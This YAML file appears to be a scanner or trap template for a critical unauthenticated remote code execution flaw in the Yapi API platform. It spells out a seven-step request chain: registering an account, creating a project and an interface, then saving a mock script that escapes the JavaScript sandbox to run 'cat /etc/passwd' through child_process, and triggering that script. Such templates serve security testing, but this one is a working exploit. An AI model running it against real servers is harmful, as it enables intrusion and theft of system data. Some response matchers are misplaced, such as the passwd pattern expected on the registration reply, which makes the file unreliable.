id: yapi-rce
info:
  name: Yapi - Remote Code Execution
  author: pikpikcu
  description: Yapi allows remote unauthenticated attackers to cause the product to
    execute arbitrary code.
  severity: critical
  reference:
  - https://www.secpulse.com/archives/162502.html
  - https://gist.github.com/pikpikcu/0145fb71203c8a3ad5c67b8aab47165b
  - https://twitter.com/sec715/status/1415484190561161216
  - https://github.com/YMFE/yapi
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  metadata:
    max-request: 7
  tags: yapi,rce,intrusive
traps:
- request:
    method: POST
    path: /api/user/reg
    headers:
      Content-Type: application/json;charset=UTF-8
    body: '{"email":"{{randstr}}@interact.sh","password":"{{randstr}}","username":"{{randstr}}"}

      '
  response:
    status_code: 200
    headers: {}
    body: 'root:.*:0:0:'
- request:
    method: GET
    path: /api/group/list
    headers:
      Content-Type: application/json, text/plain, */*
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /api/project/add
    headers:
      Content-Type: application/json;charset=UTF-8
    body: '{"name":"{{randstr}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /api/project/get?id=
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /api/interface/add
    headers:
      Content-Type: application/json;charset=UTF-8
    body: '{"method":"GET","catid":"{{project_id}}","title":"{{randstr_1}}","path":"/{{randstr_1}}","project_id":{{project_id}}}

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /api/plugin/advmock/save
    headers:
      Content-Type: application/json;charset=UTF-8
    body: '{"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const
      sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor
      = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor(''return
      process'')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"cat
      /etc/passwd\").toString()","enable":true}

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /mock//
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
